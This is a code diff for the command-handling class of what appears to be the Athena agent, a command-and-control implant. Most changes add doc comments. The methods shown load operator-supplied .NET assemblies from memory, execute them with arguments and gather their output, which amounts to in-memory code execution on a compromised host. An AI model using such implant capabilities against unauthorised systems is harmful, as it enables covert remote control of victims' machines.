@@ -29,21 +29,10 @@ namespace Athena.Commands
             this.executeAssemblyContext = new ExecuteAssemblyContext();
             this.loadedCommands = new ConcurrentDictionary<string, Assembly>();
         }
-        public async Task<string> LoadAssemblyAsync(byte[] asm)
-        {
-            //This will load an assembly into our Assembly Load Context for usage with.
-            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
-            try
-            {
-                this.commandContext.LoadFromStream(new MemoryStream(asm));
-                //Return true if success
-                return "Assembly Loaded!";
-            }
-            catch (Exception e)
-            {
-                return e.Message;
-            }
-        }
+        /// <summary>
+        /// Load an assembly into our execution context
+        /// </summary>
+        /// <param name="job">MythicJob containing the assembly</param>
         public async Task<ResponseResult> LoadAssemblyAsync(MythicJob job)
         {
             //This will load an assembly into our Assembly Load Context for usage with.
@@ -71,9 +60,12 @@ namespace Athena.Commands
                 };
             }
         }
+        /// <summary>
+        /// Execute an operator provided assembly with arguments
+        /// </summary>
+        /// <param name="job">MythicJob containing the assembly with arguments</param>
         public async Task<ResponseResult> ExecuteAssembly(MythicJob job) //How do I deal with this now?
         {
-            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
             if (assemblyIsRunning)
             {
                 return new ResponseResult()
@@ -131,7 +123,10 @@ namespace Athena.Commands
                 };
             }
         }
-        //Might be able to return this as an object too
+        /// <summary>
+        /// Get output from the currently running assembly
+        /// </summary>
+        /// <param name="command">Event Sender</param>
         public async Task<ResponseResult> GetAssemblyOutput()
         {
             await this.executeAssemblyWriter.FlushAsync();
@@ -143,6 +138,10 @@ namespace Athena.Commands
                 completed = (!this.assemblyIsRunning).ToString()
             };
         }
+        /// <summary>
+        /// Clear the execution context of any loaded assemblies
+        /// </summary>
+        /// <param name="job">MythicJob containing the assembly</param>
         public async Task<ResponseResult> ClearAssemblyLoadContext(MythicJob job)
         {
             //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
@@ -169,6 +168,10 @@ namespace Athena.Commands
                 };
             }
         }
+        /// <summary>
+        /// Load a command into the command execution context
+        /// </summary>
+        /// <param name="job">MythicJob containing the assembly</param>
         public async Task<LoadCommandResponseResult> LoadCommandAsync(MythicJob job)
         {
             LoadCommand command = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
@@ -204,6 +207,10 @@ namespace Athena.Commands
 
             }
         }
+        /// <summary>
+        /// Run a previously loaded command
+        /// </summary>
+        /// <param name="job">MythicJob containing the assembly</param>
         public async Task<object> RunLoadedCommand(MythicJob job)
         {
             try
@@ -227,6 +234,10 @@ namespace Athena.Commands
                 };
             }
         }
+        /// <summary>
+        /// Check to see if a command is already loaded
+        /// </summary>
+        /// <param name="command">Event Sender</param>
         public async Task<bool> CommandIsLoaded(string command)
         {
             return this.loadedCommands.ContainsKey(command);
